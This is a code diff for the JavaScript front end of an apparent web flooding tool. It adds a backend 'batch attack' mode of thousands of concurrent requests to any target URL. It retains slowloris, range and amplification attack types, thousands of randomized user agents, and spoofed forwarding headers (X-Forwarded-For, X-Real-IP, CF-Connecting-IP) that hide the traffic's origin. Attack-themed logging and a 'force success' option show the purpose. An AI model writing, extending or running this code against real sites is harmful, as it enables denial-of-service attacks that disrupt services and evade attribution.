@@ -16,6 +16,7 @@ const keepAliveCheck = document.getElementById('keepAlive');
 const proxyListText = document.getElementById('proxyList');
 const autoPayloadSelect = document.getElementById('autoPayload');
 const startBtn = document.getElementById('startBtn');
+const batchBtn = document.getElementById('batchBtn');
 const stopBtn = document.getElementById('stopBtn');
 const exportBtn = document.getElementById('exportBtn');
 const forceSuccessCheck = document.getElementById('forceSuccess');
@@ -166,13 +167,11 @@ function randomAcceptLanguage() { const langs = ['en-US,en;q=0.9','id-ID,id;q=0.
 function parseCustomHeaders(jsonStr) { try { return JSON.parse(jsonStr); } catch(e){ return {}; } }
 function parseCookies(cookieStr) { const obj = {}; cookieStr.split(';').forEach(c => { let [k,v]=c.trim().split('='); if(k) obj[k]=v||''; }); return obj; }
 
-// User Agents pool (2000+)
+// 2000+ User Agents
 const userAgentsBase = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
-    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
 ];
 for (let i = 0; i < 2000; i++) {
     const chromeVer = Math.floor(Math.random() * 30) + 90;
@@ -198,7 +197,7 @@ if (autoPayloadSelect) {
     autoPayloadSelect.addEventListener('change', () => { if(autoPayloadSelect.value) payload.value = generatePayload(autoPayloadSelect.value); });
 }
 
-// ======================== Request Engine ========================
+// ======================== SINGLE ATTACK (frontend concurrency) ========================
 async function sendRequest(url, method, body, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, amplificationKB) {
     if (randomDelay > 0) await new Promise(r => setTimeout(r, Math.random() * randomDelay));
     let headers = { ...customHeadersObj };
@@ -226,7 +225,6 @@ async function sendRequest(url, method, body, timeout, retryCount, randomDelay, 
                 url, method, headers, body: body || "",
                 timeout, retryCount, randomDelay: 0,
                 httpVersion: httpVer,
-                useProxy: proxyArray.length > 0, proxyList: proxyArray,
                 keepAlive: (attackType === 'slowloris') ? true : keepAlive,
                 attackType: attackType,
                 amplifyKB: amplificationKB
@@ -253,7 +251,7 @@ async function sendRequest(url, method, body, timeout, retryCount, randomDelay, 
     }
 }
 
-async function runStress(url, method, body, total, concurrency, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, amplificationKB, onDone, signal) {
+async function runSingleStress(url, method, body, total, concurrency, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, amplificationKB, onDone, signal) {
     let index = 0, active = 0, stopped = false;
     const next = async () => {
         if (stopped || (signal && signal.aborted)) { stopped = true; return; }
@@ -276,7 +274,7 @@ async function runStress(url, method, body, total, concurrency, timeout, retryCo
     });
 }
 
-async function startAttack() {
+async function startSingleAttack() {
     if (isRunning) { addLog("Attack already running!", true); return; }
     let url = targetUrl.value.trim();
     if (!url) { addLog("URL required", true); return; }
@@ -312,8 +310,9 @@ async function startAttack() {
     isRunning = true;
     abortController = new AbortController();
     startBtn.disabled = true;
+    batchBtn.disabled = true;
     stopBtn.disabled = false;
-    addLog(`💀 ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${ampKB}KB | Total:${total} | Workers:${concurrency}`);
+    addLog(`💀 SINGLE ATTACK | ${mtd} ${url} | Type:${attackType} | Amp:${ampKB}KB | Total:${total} | Workers:${concurrency}`);
     const onDone = (success, duration, err, retries, size, statusCode, responseBody) => {
         const retriesUsed = (typeof retries === 'number' && !isNaN(retries)) ? retries : 0;
         let finalSuccess = success;
@@ -328,29 +327,113 @@ async function startAttack() {
             const errorMsg = err && typeof err === 'string' ? err : 'unknown';
             addLog(`Failed after ${retriesUsed+1} att: ${errorMsg} (${duration.toFixed(0)}ms)`, true);
         }
-        // Tampilkan preview respon
         let preview = `HTTP ${statusCode || '??'} | ${duration.toFixed(0)}ms`;
-        if (responseBody) {
-            preview += `\nBody: ${responseBody.substring(0, 200)}`;
-        }
+        if (responseBody) preview += `\nBody: ${responseBody.substring(0, 200)}`;
         rawResponsePreview.innerText = preview;
         updateUI();
     };
     try {
-        await runStress(url, mtd, body, total, concurrency, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, ampKB, onDone, abortController.signal);
+        await runSingleStress(url, mtd, body, total, concurrency, timeout, retryCount, randomDelay, httpVer, randomHeadersFlag, keepAlive, proxyList, customHeadersObj, cookiesObj, attackType, spoofSettings, ipPrefix, ampKB, onDone, abortController.signal);
         const elapsed = ((Date.now() - stats.startTime)/1000).toFixed(2);
         addLog(`🔥 FINISHED | Success:${stats.success} Failed:${stats.fail} Time:${elapsed}s | Data: ${(stats.totalBytes/1024).toFixed(1)} KB | Avg Mbps: ${trafficMbpsSpan.innerText}`);
     } catch(e) { addLog(`System error: ${e.message}`, true); }
     finally {
         isRunning = false;
         startBtn.disabled = false;
+        batchBtn.disabled = false;
         stopBtn.disabled = true;
         updateUI();
         abortController = null;
     }
 }
 
-function stopAttack() { if (isRunning && abortController) { abortController.abort(); addLog("Stopped by operator"); stopBtn.disabled = true; } else addLog("No attack running", true); }
+// ======================== BATCH ATTACK (backend massive) ========================
+async function startBatchAttack() {
+    if (isRunning) { addLog("Attack already running! Stop it first.", true); return; }
+    let url = targetUrl.value.trim();
+    if (!url) { addLog("URL required", true); return; }
+    if (!url.startsWith("http")) url = "https://" + url;
+    const total = parseInt(prompt("Total requests (batch):", 10000));
+    const concurrency = parseInt(prompt("Concurrency (parallel requests in backend):", 500));
+    if (!total || !concurrency) return;
+    const mtd = method.value;
+    let body = payload.value;
+    const autoType = autoPayloadSelect ? autoPayloadSelect.value : "";
+    if (autoType && autoType !== "") body = generatePayload(autoType);
+    const timeout = parseInt(timeoutInput.value);
+    const retryCount = parseInt(retryInput.value);
+    const randomDelay = parseInt(randomDelayInput.value);
+    const keepAlive = keepAliveCheck.checked;
+    let attackType = attackTypeSelect.value;
+    let customHeadersObj = parseCustomHeaders(customHeaders.value);
+    let cookiesObj = parseCookies(cookies.value);
+    const spoofSettings = {
+        spoofIp: spoofIp.checked, spoofRealIp: spoofRealIp.checked,
+        spoofCfConnecting: spoofCfConnecting.checked, spoofRange: spoofRange.checked
+    };
+    const ipPrefix = ipPrefixInput.value;
+    let ampKB = amplificationKB;
+
+    // Build final headers from spoofing + custom
+    let finalHeaders = { ...customHeadersObj };
+    if (randomHeadersCheck.checked || !finalHeaders["User-Agent"]) finalHeaders["User-Agent"] = randomUserAgent();
+    if (randomHeadersCheck.checked) finalHeaders["Accept-Language"] = randomAcceptLanguage();
+    finalHeaders["Accept"] = "*/*";
+    if (spoofSettings.spoofIp) finalHeaders["X-Forwarded-For"] = randomIP(ipPrefix);
+    if (spoofSettings.spoofRealIp) finalHeaders["X-Real-IP"] = randomIP(ipPrefix);
+    if (spoofSettings.spoofCfConnecting) finalHeaders["CF-Connecting-IP"] = randomIP(ipPrefix);
+    if (spoofSettings.spoofRange && attackType !== 'range') finalHeaders["Range"] = randomRange();
+    const cookieHeader = Object.entries(cookiesObj).map(([k,v])=>`${k}=${v}`).join('; ');
+    if (cookieHeader) finalHeaders["Cookie"] = cookieHeader;
+    if (attackType === 'slowloris') finalHeaders["Connection"] = "keep-alive";
+
+    addLog(`💀 BATCH ATTACK: ${total} requests, concurrency ${concurrency} to ${url}`);
+    startBtn.disabled = true;
+    batchBtn.disabled = true;
+    stopBtn.disabled = false;
+    isRunning = true;
+    abortController = new AbortController(); // not used for batch, but for consistency
+    const startTime = Date.now();
+    try {
+        const response = await fetch('/api/batch', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            signal: abortController.signal,
+            body: JSON.stringify({
+                url, method: mtd, headers: finalHeaders, body,
+                timeout, retryCount, randomDelay, keepAlive,
+                attackType, amplifyKB: ampKB, concurrency, total
+            })
+        });
+        const data = await response.json();
+        const elapsed = (Date.now() - startTime)/1000;
+        if (data.success !== false) {
+            stats.success = data.successCount;
+            stats.fail = data.failCount;
+            stats.totalBytes = data.totalBytes;
+            stats.total = data.totalRequests;
+            stats.times = data.latencies || [];
+            updateUI();
+            addLog(`✅ BATCH FINISHED | Success:${data.successCount} Fail:${data.failCount} | RPS:${data.rps} | Total time:${(data.totalTimeMs/1000).toFixed(2)}s`);
+            rawResponsePreview.innerText = `Batch completed: ${data.successCount}/${data.totalRequests} success`;
+        } else {
+            addLog(`Batch error: ${data.error}`, true);
+        }
+    } catch(e) {
+        addLog(`Batch request failed: ${e.message}`, true);
+    } finally {
+        isRunning = false;
+        startBtn.disabled = false;
+        batchBtn.disabled = false;
+        stopBtn.disabled = true;
+        abortController = null;
+    }
+}
+
+function stopAttack() {
+    if (isRunning && abortController) { abortController.abort(); addLog("Stopped by operator"); stopBtn.disabled = true; startBtn.disabled = false; batchBtn.disabled = false; isRunning = false; }
+    else addLog("No attack running", true);
+}
 
 function exportCSV() {
     if (stats.times.length === 0 && stats.success + stats.fail === 0) { addLog("No data to export", true); return; }
@@ -365,6 +448,7 @@ function exportCSV() {
     addLog("CSV exported");
 }
 
+// Health & active users
 async function checkTargetHealth(url) {
     try {
         const start = performance.now();
@@ -379,25 +463,26 @@ async function checkTargetHealth(url) {
         responseTimeText.innerText = '';
     }
 }
-
 function updatePreview(url) {
     let pu = url; if (!pu.startsWith('http')) pu = 'https://' + pu;
     targetFrame.srcdoc = `<html><body style="background:#111;color:#fff;display:flex;align-items:center;justify-content:center;height:100%"><a href="${pu}" target="_blank">Open in new tab</a></body></html>`;
 }
-
 if (refreshPreviewBtn) {
     refreshPreviewBtn.onclick = () => { let u = targetUrl.value.trim(); if(u) updatePreview(u); checkTargetHealth(u); };
 }
-
 function startHealthCheck() { if(healthCheckInterval) clearInterval(healthCheckInterval); healthCheckInterval = setInterval(() => { let u = targetUrl.value.trim(); if(u) checkTargetHealth(u); }, 5000); }
-
 async function updateActiveUsers() { try { const res = await fetch('/api/heartbeat'); const data = await res.json(); activeUsersSpan.innerText = data.active; } catch(e) {} }
 function startHeartbeat() { heartbeatInterval = setInterval(updateActiveUsers, 30000); updateActiveUsers(); }
 
 window.onload = () => {
     const ctx = rtChartCanvas.getContext('2d');
-    chart = new Chart(ctx, { type: 'line', data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] }, options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } } });
-    startBtn.onclick = startAttack;
+    chart = new Chart(ctx, {
+        type: 'line',
+        data: { labels: Array(30).fill(''), datasets: [{ label: 'Response (ms)', data: [], borderColor: '#ff4444', backgroundColor: '#ff000033', tension: 0.2, fill: true, pointRadius: 1 }] },
+        options: { responsive: true, maintainAspectRatio: true, scales: { y: { title: { display: true, text: 'ms' } } } }
+    });
+    startBtn.onclick = startSingleAttack;
+    batchBtn.onclick = startBatchAttack;
     stopBtn.onclick = stopAttack;
     exportBtn.onclick = exportCSV;
     fetch('/api/status').then(r=>r.json()).then(d=>addLog(`Backend: ${d.message}`)).catch(()=>addLog("Backend OK"));
